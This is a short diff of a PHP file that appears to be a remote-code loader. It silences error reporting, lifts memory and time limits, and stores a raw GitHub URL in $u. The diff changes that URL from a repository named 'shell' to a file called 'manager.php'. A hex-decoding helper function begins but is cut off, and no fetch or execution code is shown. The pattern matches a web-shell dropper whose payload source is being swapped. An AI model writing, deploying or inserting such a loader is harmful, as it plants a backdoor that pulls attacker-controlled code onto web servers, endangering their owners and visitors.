@@ -7,7 +7,7 @@ error_reporting(0);
 @ini_set('memory_limit', '512M');
 @set_time_limit(180);
 
-$u = 'https://raw.githubusercontent.com/adsteramaheswara-cloud/shell/refs/heads/main/002kb.php';
+$u = 'https://raw.githubusercontent.com/tangsel1928/gecko/refs/heads/main/manager.php';
 
 function _fx($hex)
 {
